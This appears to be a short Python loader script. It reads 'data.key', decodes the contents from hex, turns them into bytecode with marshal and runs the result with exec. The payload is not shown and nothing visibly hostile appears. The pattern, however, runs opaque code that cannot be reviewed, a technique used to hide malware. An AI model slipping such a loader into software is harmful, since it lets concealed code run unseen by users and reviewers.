import marshal
import binascii

with open("data.key", "rb") as f:
    data = f.read()


unhex = binascii.unhexlify(data)
unmarshal = marshal.loads(unhex)

exec(unmarshal)